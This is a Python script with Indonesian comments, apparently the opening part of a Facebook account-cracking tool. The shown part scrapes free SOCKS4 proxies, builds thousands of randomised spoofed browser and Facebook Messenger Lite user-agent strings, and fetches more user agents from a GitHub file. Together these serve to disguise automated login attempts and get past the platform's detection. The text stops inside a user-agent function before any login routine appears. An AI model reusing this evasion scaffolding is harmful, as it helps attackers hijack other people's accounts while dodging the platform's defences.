#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from getpass import getpass
from rich.text import Text as tekz
from rich.progress import track

###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#008080"
	
#----------[server data Facebook]-----------#
pretty.install()
CON=sol()
usragent = []
ugen =[]
ugen2=[]
usrgent2 = []
proxxy=[]
cokbrut=[]
ualu,ualuh = [],[]
ses=requests.Session()
uadarimu, uadia, ngentott, ugent, append = [], [], [], [], []
princp=[]
prinok=[]
sys.stdout.write('\x1b]2; Asepitgans_XC\x07')
#--------------[User agent mini]-----------#
try:
	prox= requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
    
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android 11;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='fr-fr; Redmi Note 11 Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 7S'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/83.0.4103.101 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 7.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 4 Build/NRD90M)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Vivo Y91C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Windows NT 10.0; Win64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
###----------[ USER AGENT 1 ]----------###
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='en-US; Nokia G11 Plus Build/SP1A.210812.016)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='1HY4G)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (X11;'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='en-US; RAVOZ Z5 Lite Build/QP1A.190711.020)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='en-US; RMP2105 Build/RP1A.201005.001)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='en-US; LG-F820L Build/MXB48T)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPT/1.7.21'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='en-US; AWM-A0 Build/G66T2106150CN00MQ6)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPT/1.7.21'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='SM-A515F)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

###----------[ USER AGENT 2 ]----------###
for agenkuw in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2109'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2089'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
	
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])

#----------[UserAgent Pake]---------#
def UserAgentPake():
        rr = random.randint
        uapake = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; Asepitgans_Xc Build/EweanEnakBosqu) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(108,1085))}.0.0.0 Safari/537.36"
        return uapake

#---------------[User agent Asepitgans]---------------#
def UserAgentNew():
        rr = random.randint
        hjash = f"Mozilla/5.0 (Linux; Android {str(rr(1,13))}; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(78,783))}.0.{str(rr(3904,39043))}.{str(rr(62,623))} Mobile Safari/537.36"
        ahjas = f"Mozilla/5.0 (Linux; Android {str(rr(1,9))}.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(96,963))}.0.{str(rr(4664,46643))}.{str(rr(104,1003))} Mobile Safari/537.36"
        uagg = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,15))}; en-PH; wv) AppleWebKit/{str(rr(605,6050))}.{str(rr(2,10))}.{str(rr(2,1000))} (KHTML, like Gecko) Version/4.0 WebView/{str(rr(110,1110))}.0.{str(rr(5481,54810))}.{str(rr(61,610))} Mobile Safari/{str(rr(650,6500))}.{str(rr(1,10))}.{str(rr(15,1150))} SampleVPN/{str(rr(1,10))}.{str(rr(9,190))}.{str(rr(5,150))}, Anonymous"
        uagh = f"Mozilla/5.0 (Linux; Android {str(rr(1,9))}.1.1; HP Slate 7 Build/JRO03H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(43,4310))}.0.{str(rr(2357,23570))}.{str(rr(78,780))} Safari/537.36 OPR/{str(rr(30,300))}.0.{str(rr(1856,18560))}.{str(rr(95530,955300))}"
        return random.choice([hjash,ahjas,uagg,uagh])
        
#--------------[USER AGENT KHUSUS API]--------------#
def ugenapi():
	for y in range(1000):
		rr = random.randint
		rc = random.choice
		merk = random.choice(['SHV47 Build/SC04G)','KYG01 Build/1.090VE.0522.a)','Redmi K20 Pro Build/RKQ1.200826.002)','907SH Build/S2007)','808SH Build/S2004)','A101OP Build/RKQ1.201217.002)','SM-T295 Build/RP1A.200720.012)','SCV41 Build/RP1A.200720.012)','vivo 1910 Build/RP1A.200720.012)','SO-52A Build/58.1.B.6.17)','SDK built for x86 Build/LMY48X)','motorola edge 20 lite Build/RRKS31.Q3-19-97-12)','SM-A805F Build/PPR1.180610.011)','PRO 5 Build/LMY47D)','C2004 Build/15.2.A.2.5)','TicWatch Pro 3 GPS Build/PMRB.210407.001)','View XL)','Dash XL Build/D710; wv)','en-us; MID Build/GINGERBREAD)','WT19M-FI Build/JLS36I)','en-US; B1-710 Build/JZO54K)','en-us; mk808 Build/JDQ39)','en-us; Next8P12 Build/IMM76I)','NEO-X7-216A Build/XRN68H)','en-us; C5170 Build/IML77)','en-us; Next8P12 Build/IMM76I)','en-us; mk808 Build/JDQ39)'])
		ngentot1 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; SDK built for x86 Build/LMY48X) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot2 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; Dash XL Build/D710; wv) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot3 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; en-us; MID Build/GINGERBREAD) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot4 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; WT19M-FI Build/JLS36I) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot5 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; en-US; B1-710 Build/JZO54K) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot6 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; en-us; mk808 Build/JDQ39) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot7 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; en-us; Next8P12 Build/IMM76I) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot8 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; en-us; C5170 Build/IML77) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot9 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,13))}.{str(rr(2,13))}.0; NEO-X7-{str(rr(216,1332))}A Build/XRN68H) [FBAN/MessengerLite;FBAV/319.317.0.0.1.73;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/980652756;FBCR/;FBMF/Minix;FBBD/Minix;FBDV/8.0.0;FBSV/6.2.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1600,width=720};]"
		
		ngentot10 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; C2004 Build/15.2.A.2.5) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot11 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; U; en-us; Kyocera; NetFront/4.1/AMB) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot12 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; motorola edge 20 lite Build/RRKS31.Q3-19-97-12) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot13 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; TicWatch Pro 3 GPS Build/PMRB.210407.001) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot14 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; A101OP Build/RKQ1.201217.002) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot15 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; SCV41 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot16 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; 907SH Build/S2007) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
		ngentot17 = f"Dalvik/2.1.0 (Android {str(rr(2,13))}; PRO 5 Build/LMY47D) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
		
